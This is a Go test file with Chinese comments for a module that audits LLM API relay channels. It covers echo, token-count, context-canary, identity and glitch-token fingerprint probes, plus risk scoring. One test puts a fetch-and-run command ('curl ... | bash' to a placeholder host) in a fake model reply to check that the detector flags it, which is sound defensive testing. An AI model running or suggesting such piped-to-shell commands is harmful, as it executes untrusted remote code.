package behavior

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"testing"

	"github.com/bestruirui/octopus/internal/modelverify"
)

// stubSender 用闭包应答，避免为每个探针各写一个假结构体。
type stubSender struct {
	fn func(ask modelverify.Ask) (modelverify.Response, error)
}

func (s stubSender) Ask(_ context.Context, ask modelverify.Ask) (modelverify.Response, error) {
	return s.fn(ask)
}

// echoLivenessSender 模拟一个守规矩的渠道：把指令里的随机串原样回显。
// 探针的期望值是随机的，所以假 sender 必须从题面里把它抠出来，
// 不能写死一个常量。
func echoLivenessSender() stubSender {
	return stubSender{fn: func(ask modelverify.Ask) (modelverify.Response, error) {
		const prefix = "Reply with exactly: "
		expected := strings.TrimSpace(strings.TrimPrefix(ask.Prompt, prefix))
		return modelverify.Response{Content: expected, FinishReason: "stop"}, nil
	}}
}

// ------------------------------------------------------------------ 家族表

func TestInferFamiliesMatchesAliases(t *testing.T) {
	cases := []struct {
		text string
		want []string
	}{
		{"I am Claude, made by Anthropic.", []string{"anthropic"}},
		{"I am a GPT model from OpenAI.", []string{"openai"}},
		{"我是通义千问，由阿里云研发。", []string{"qwen"}},
		{"I'm DeepSeek-V3.", []string{"deepseek"}},
		{"", nil},
		{"no model name here", nil},
	}
	for _, tc := range cases {
		got := InferFamilies(tc.text)
		if len(got) != len(tc.want) {
			t.Fatalf("InferFamilies(%q) = %v, want %v", tc.text, got, tc.want)
		}
		for i := range got {
			if got[i] != tc.want[i] {
				t.Fatalf("InferFamilies(%q) = %v, want %v", tc.text, got, tc.want)
			}
		}
	}
}

// 顺序必须稳定：Go 的 map 遍历序是随机的，若 InferFamilies 直接遍历 map，
// 这同一段文本会在不同运行里产出不同顺序的切片。
func TestInferFamiliesIsDeterministic(t *testing.T) {
	first := InferFamilies("claude via bedrock and a gpt fallback")
	for i := 0; i < 20; i++ {
		got := InferFamilies("claude via bedrock and a gpt fallback")
		if len(got) != len(first) {
			t.Fatalf("第 %d 次结果长度不同: %v vs %v", i, got, first)
		}
		for j := range got {
			if got[j] != first[j] {
				t.Fatalf("第 %d 次结果顺序不同: %v vs %v", i, got, first)
			}
		}
	}
}

func TestFamiliesIntersectRequiresBothSides(t *testing.T) {
	if FamiliesIntersect([]string{"openai"}, []string{"openai"}) != true {
		t.Fatal("相同家族应当有交集")
	}
	if FamiliesIntersect([]string{"openai"}, []string{"anthropic"}) != false {
		t.Fatal("不同家族不应有交集")
	}
	// 任一侧为空都必须返回 false：缺一边就谈不上"不匹配"。
	if FamiliesIntersect(nil, []string{"openai"}) != false {
		t.Fatal("左空时不应判定为有交集")
	}
	if FamiliesIntersect([]string{"openai"}, nil) != false {
		t.Fatal("右空时不应判定为有交集")
	}
}

// ------------------------------------------------------------------ glitch 匹配

func TestMatchGlitchFamiliesExactMatch(t *testing.T) {
	// moonshot 的签名是 {5, 11, 12}。
	got := MatchGlitchFamilies([]int{5, 11, 12})
	if len(got) == 0 {
		t.Fatal("应当至少有一个候选家族")
	}
	best := got[0]
	if best.Family != "moonshot" {
		t.Fatalf("最佳家族 = %q, 期望 moonshot", best.Family)
	}
	if !best.Exact || !best.Consistent {
		t.Fatalf("应为 exact+consistent: %+v", best)
	}
	if best.Coverage != 1 || best.Confidence != 1 {
		t.Fatalf("coverage/confidence 应为 1: %+v", best)
	}
}

func TestMatchGlitchFamiliesPartialOverlapIsConsistent(t *testing.T) {
	// 只错了 11，落在 moonshot 签名内 -> consistent 但不是 exact。
	got := MatchGlitchFamilies([]int{11})
	if len(got) == 0 {
		t.Fatal("应当至少有一个候选家族")
	}
	best := got[0]
	if best.Family != "moonshot" {
		t.Fatalf("最佳家族 = %q, 期望 moonshot", best.Family)
	}
	if best.Exact {
		t.Fatal("单条不应判为 exact")
	}
	if !best.Consistent {
		t.Fatal("签名内的失败应当判为 consistent")
	}
}

// 关键豁免：失败编号若包含签名外的编号，就不能算"符合这个家族的特征错法"。
func TestMatchGlitchFamiliesRejectsSignatureOutsiders(t *testing.T) {
	// 11 属于 moonshot，1 属于 mimo -> 没有任何家族能给出 consistent。
	got := MatchGlitchFamilies([]int{1, 11})
	for _, c := range got {
		if c.Consistent {
			t.Fatalf("含签名外编号时不应有 consistent 候选: %+v", c)
		}
	}
}

func TestMatchGlitchFamiliesEmptyInput(t *testing.T) {
	if got := MatchGlitchFamilies(nil); got != nil {
		t.Fatalf("空失败集合应返回 nil, 得到 %v", got)
	}
}

// ------------------------------------------------------------------ glitch 解析

func glitchReply(mangle map[int]string) string {
	var b strings.Builder
	for i := 1; i <= GlitchTokenCount(); i++ {
		body := GlitchToken(i)
		if repl, ok := mangle[i]; ok {
			body = repl
		}
		fmt.Fprintf(&b, "%d. %s\n", i, body)
	}
	return b.String()
}

func TestObserveGlitchComplete(t *testing.T) {
	// 第 6、13 条复述错误（正是 deepseek 的签名）。
	obs := observeGlitch(glitchReply(map[int]string{6: "???", 13: "???"}), "stop")
	if !obs.Complete || !obs.Analyzable {
		t.Fatalf("应判定为 complete+analyzable: %+v", obs)
	}
	if len(obs.FailedIdx) != 2 || obs.FailedIdx[0] != 6 || obs.FailedIdx[1] != 13 {
		t.Fatalf("失败编号 = %v, 期望 [6 13]", obs.FailedIdx)
	}
	candidates := MatchGlitchFamilies(obs.FailedIdx)
	if len(candidates) == 0 || candidates[0].Family != "deepseek" {
		t.Fatalf("应匹配到 deepseek, 得到 %v", candidates)
	}
}

// 换行与引号不该影响"是否记错"的判定。
func TestObserveGlitchNormalizesWhitespaceAndQuotes(t *testing.T) {
	quoted := glitchReply(map[int]string{1: `".DataGridView"` + "\n" + `ColumnHeadersHeightSizeMode`})
	obs := observeGlitch(quoted, "stop")
	if containsInt(obs.FailedIdx, 1) {
		t.Fatalf("插入换行与引号不应判为记错: %+v", obs)
	}
}

// 早停豁免：编号连续到 n、前 n-1 条全对、第 n 条错、且 n 是某家族签名编号。
func TestObserveGlitchEarlyStopIsAnalyzable(t *testing.T) {
	var b strings.Builder
	for i := 1; i <= 8; i++ {
		body := GlitchToken(i)
		if i == 8 {
			body = "" // 上游举的例子：GPT-4.1-mini 输出空的「8.」后正常 stop
		}
		fmt.Fprintf(&b, "%d. %s\n", i, body)
	}
	obs := observeGlitch(b.String(), "stop")
	if !obs.Analyzable {
		t.Fatalf("编号 8 属于 openai 签名，应当判为可分析的早停: %+v", obs)
	}
	if obs.EarlyStopIdx != 8 {
		t.Fatalf("早停编号 = %d, 期望 8", obs.EarlyStopIdx)
	}
	if len(obs.FailedIdx) != 1 || obs.FailedIdx[0] != 8 {
		t.Fatalf("早停时失败集合应为 [8], 得到 %v", obs.FailedIdx)
	}
}

// 早停豁免要求编号 1..n 且 n ≥ 2：只输出了第 1 条就收尾，缺少"前面全部答对"
// 这个前提，否则任何模型偶尔少答几条都会被包装成指纹。
func TestObserveGlitchEarlyStopNeedsAtLeastTwoEntries(t *testing.T) {
	obs := observeGlitch("1. \n", "stop")
	if obs.Analyzable {
		t.Fatalf("单条早停不应判为可分析: %+v", obs)
	}
}

// finish_reason 不是 stop 时（例如被长度上限砍断）不得走早停豁免——
// 那是"我们给的预算不够"，不是模型记错了。
func TestObserveGlitchEarlyStopRequiresStopReason(t *testing.T) {
	var b strings.Builder
	for i := 1; i <= 8; i++ {
		body := GlitchToken(i)
		if i == 8 {
			body = ""
		}
		fmt.Fprintf(&b, "%d. %s\n", i, body)
	}
	obs := observeGlitch(b.String(), "length")
	if obs.Analyzable {
		t.Fatalf("被长度截断时不应走早停豁免: %+v", obs)
	}
}

// 完整的 15 条但被长度上限截断，同样不算可分析：末尾可能刚好被砍掉。
func TestObserveGlitchCompleteButTruncatedIsRejected(t *testing.T) {
	obs := observeGlitch(glitchReply(nil), "length")
	if obs.Complete || obs.Analyzable {
		t.Fatalf("截断的完整回答不应判为 complete: %+v", obs)
	}
}

// 编号不连续时必须放弃：漏掉中间某条还能继续编号，说明模型没按题目做，
// 此时失败集合不再反映"记错哪几条"。
func TestObserveGlitchNonContiguousIsRejected(t *testing.T) {
	obs := observeGlitch("1. "+GlitchToken(1)+"\n3. "+GlitchToken(3)+"\n", "stop")
	if obs.Analyzable {
		t.Fatalf("编号不连续时不应判为可分析: %+v", obs)
	}
}

// ------------------------------------------------------------------ 探针

func TestRunLivenessPassesOnEcho(t *testing.T) {
	res := RunProbe(context.Background(), ProbeLiveness, echoLivenessSender())
	if res.Err != nil {
		t.Fatalf("不应报错: %v", res.Err)
	}
	if !res.OK {
		t.Fatalf("回显正确时应通过: %+v", res.Data)
	}
}

func TestRunLivenessFailsOnWrongEcho(t *testing.T) {
	s := stubSender{fn: func(modelverify.Ask) (modelverify.Response, error) {
		return modelverify.Response{Content: "I cannot do that.", FinishReason: "stop"}, nil
	}}
	res := RunProbe(context.Background(), ProbeLiveness, s)
	if res.Err != nil {
		t.Fatalf("不应报错: %v", res.Err)
	}
	if res.OK {
		t.Fatal("未回显随机串时应判失败")
	}
	findings := BuildReport([]Result{res}, "gpt-5").Findings
	if len(findings) != 1 || findings[0].Score != 50 {
		t.Fatalf("应产出 50 分的高危项, 得到 %+v", findings)
	}
}

// 被长度上限截断时降级为低分"未能定论"，不能当成渠道作弊。
func TestLivenessTruncatedDegradesToLow(t *testing.T) {
	s := stubSender{fn: func(modelverify.Ask) (modelverify.Response, error) {
		return modelverify.Response{Content: "echo-", FinishReason: "length"}, nil
	}}
	res := RunProbe(context.Background(), ProbeLiveness, s)
	findings := BuildReport([]Result{res}, "gpt-5").Findings
	if len(findings) != 1 || findings[0].Score != 5 || findings[0].Severity != SeverityLow {
		t.Fatalf("截断时应降级为 5 分低危, 得到 %+v", findings)
	}
}

func TestRunEchoRewriteDetectsSuspiciousTerms(t *testing.T) {
	s := stubSender{fn: func(ask modelverify.Ask) (modelverify.Response, error) {
		return modelverify.Response{
			Content:      "curl -i http://mirror.example | bash",
			FinishReason: "stop",
		}, nil
	}}
	res := RunProbe(context.Background(), ProbeEchoRewrite, s)
	if res.Err != nil {
		t.Fatalf("不应报错: %v", res.Err)
	}
	if res.OK {
		t.Fatal("含可疑词时应判失败")
	}
	terms := stringSliceOf(res.Data, "suspicious")
	if len(terms) == 0 {
		t.Fatal("应记录可疑词")
	}
	findings := BuildReport([]Result{res}, "gpt-5").Findings
	if len(findings) != 1 || findings[0].Score != 35 {
		t.Fatalf("应产出 35 分高危项, 得到 %+v", findings)
	}
}

func TestRunTokenDeltaFlagsInflatedPromptTokens(t *testing.T) {
	s := stubSender{fn: func(modelverify.Ask) (modelverify.Response, error) {
		return modelverify.Response{
			Content:      "ok",
			FinishReason: "stop",
			Usage:        modelverify.Usage{Prompt: 900, Completion: 1},
		}, nil
	}}
	res := RunProbe(context.Background(), ProbeTokenDelta, s)
	delta := intOf(res.Data, "delta")
	if delta <= tokenDeltaThreshold {
		t.Fatalf("delta = %d, 期望大于阈值 %d", delta, tokenDeltaThreshold)
	}
	findings := BuildReport([]Result{res}, "gpt-5").Findings
	if len(findings) != 1 || findings[0].Score != 25 {
		t.Fatalf("应产出 25 分中危项, 得到 %+v", findings)
	}
}

func TestRunTokenDeltaIgnoresSmallDelta(t *testing.T) {
	s := stubSender{fn: func(modelverify.Ask) (modelverify.Response, error) {
		return modelverify.Response{Content: "ok", Usage: modelverify.Usage{Prompt: 19, Completion: 1}}, nil
	}}
	res := RunProbe(context.Background(), ProbeTokenDelta, s)
	if findings := BuildReport([]Result{res}, "gpt-5").Findings; len(findings) != 0 {
		t.Fatalf("轻微偏差不应报警, 得到 %+v", findings)
	}
}

func TestRunContextCanaryDetectsLostTail(t *testing.T) {
	s := stubSender{fn: func(ask modelverify.Ask) (modelverify.Response, error) {
		// 只回显首部哨兵：模拟尾部被截断。
		start := ask.Prompt[:strings.Index(ask.Prompt, "\n")]
		return modelverify.Response{Content: start, FinishReason: "stop"}, nil
	}}
	res := RunProbe(context.Background(), ProbeContextCanary, s)
	if res.OK {
		t.Fatal("尾部哨兵丢失时应判失败")
	}
	findings := BuildReport([]Result{res}, "gpt-5").Findings
	if len(findings) != 1 || findings[0].Score != 20 {
		t.Fatalf("应产出 20 分中危项, 得到 %+v", findings)
	}
}

// 被截断的 canary 探针不报警：内容被砍断证明不了上下文被砍。
func TestContextCanaryTruncatedProducesNoFinding(t *testing.T) {
	s := stubSender{fn: func(modelverify.Ask) (modelverify.Response, error) {
		return modelverify.Response{Content: "CANARY_x", FinishReason: "max_tokens"}, nil
	}}
	res := RunProbe(context.Background(), ProbeContextCanary, s)
	if findings := BuildReport([]Result{res}, "gpt-5").Findings; len(findings) != 0 {
		t.Fatalf("截断时不应报警, 得到 %+v", findings)
	}
}

func TestRunIdentityMismatchIsWeakSignal(t *testing.T) {
	// 请求 claude，模型自称是 GPT。
	s := stubSender{fn: func(modelverify.Ask) (modelverify.Response, error) {
		return modelverify.Response{Content: "I am a GPT model from OpenAI.", FinishReason: "stop"}, nil
	}}
	res := RunProbe(context.Background(), ProbeIdentity, s)
	report := BuildReport([]Result{res}, "claude-opus-4-8")
	if len(report.Findings) != 1 || report.Findings[0].Score != 15 {
		t.Fatalf("应产出 15 分弱信号, 得到 %+v", report.Findings)
	}
}

// 家族识别不出来时必须保持沉默——"看不出来"不等于"不匹配"。
func TestRunIdentitySilentWhenFamiliesUnknown(t *testing.T) {
	s := stubSender{fn: func(modelverify.Ask) (modelverify.Response, error) {
		return modelverify.Response{Content: "I am an AI assistant.", FinishReason: "stop"}, nil
	}}
	res := RunProbe(context.Background(), ProbeIdentity, s)
	if findings := BuildReport([]Result{res}, "claude-opus-4-8").Findings; len(findings) != 0 {
		t.Fatalf("家族无法识别时不应报警, 得到 %+v", findings)
	}
}

// ------------------------------------------------------------------ 评分层

// 这是与上游最重要的一处纪律：探针跑不动 ≠ 对方有问题。
func TestProbeFailureNeverScores(t *testing.T) {
	results := []Result{
		{ProbeID: ProbeLiveness, Err: errors.New("connection refused")},
		{ProbeID: ProbeEchoRewrite, Err: errors.New("context deadline exceeded")},
		{ProbeID: ProbeGlitch, Err: errors.New("upstream status 502")},
	}
	report := BuildReport(results, "gpt-5")
	if len(report.Findings) != 0 {
		t.Fatalf("探针故障不应产生风险项, 得到 %+v", report.Findings)
	}
	if report.Score != 0 {
		t.Fatalf("风险分应为 0, 得到 %d", report.Score)
	}
	if len(report.Errors) != 3 {
		t.Fatalf("应当记录 3 条探针错误, 得到 %d", len(report.Errors))
	}
	// 一条都没跑通 -> 证据不足，必须与"查过没问题"区分开。
	if report.Verdict != VerdictUnknown {
		t.Fatalf("跑通探针过少时应判 unknown, 得到 %q", report.Verdict)
	}
}

func TestReportVerdictNoneWhenAllClean(t *testing.T) {
	var results []Result
	for _, id := range DefaultProbes() {
		results = append(results, Result{ProbeID: id, OK: true, Data: map[string]any{}})
	}
	report := BuildReport(results, "gpt-5")
	if report.Verdict != VerdictNone {
		t.Fatalf("全部通过时应判 none, 得到 %q", report.Verdict)
	}
	if report.Score != 0 {
		t.Fatalf("风险分应为 0, 得到 %d", report.Score)
	}
}

func TestReportScoreIsCappedAtHundred(t *testing.T) {
	// 人为堆出超过 100 的风险项，验证封顶。
	results := []Result{
		{ProbeID: ProbeLiveness, OK: false, Data: map[string]any{"truncated": false}},
		{ProbeID: ProbeEchoRewrite, OK: false, Data: map[string]any{"truncated": false}},
		{ProbeID: ProbeTokenDelta, OK: true, Data: map[string]any{"delta": 500}},
		{ProbeID: ProbeContextCanary, OK: false, Data: map[string]any{"truncated": false}},
	}
	report := BuildReport(results, "gpt-5")
	if report.Score != 100 {
		t.Fatalf("风险分应封顶 100, 得到 %d", report.Score)
	}
	if report.Verdict != VerdictHigh {
		t.Fatalf("应判 high, 得到 %q", report.Verdict)
	}
}

// 取值助手在缺字段时必须安静退化，绝不能在审计路径上 panic。
func TestDataHelpersTolerateMissingKeys(t *testing.T) {
	var data map[string]any
	if boolOf(data, "truncated") {
		t.Fatal("nil map 应返回 false")
	}
	if intOf(data, "delta") != 0 {
		t.Fatal("nil map 应返回 0")
	}
	if stringSliceOf(data, "x") != nil || candidateSliceOf(data, "y") != nil {
		t.Fatal("nil map 应返回 nil 切片")
	}
	wrong := map[string]any{"delta": "not-an-int", "truncated": 1}
	if intOf(wrong, "delta") != 0 || boolOf(wrong, "truncated") {
		t.Fatal("类型不符时应退化为零值")
	}
}

func TestRunProbeUnknownIDFails(t *testing.T) {
	res := RunProbe(context.Background(), ProbeID("nope"), echoLivenessSender())
	if res.Err == nil {
		t.Fatal("未知探针应当报错")
	}
}

func TestRunStopsOnCanceledContext(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	results := Run(ctx, []ProbeID{ProbeLiveness, ProbeIdentity}, echoLivenessSender())
	if len(results) != 2 {
		t.Fatalf("应返回 2 项, 得到 %d", len(results))
	}
	for _, res := range results {
		if res.Err == nil {
			t.Fatalf("取消后不应继续执行探针: %+v", res)
		}
	}
}
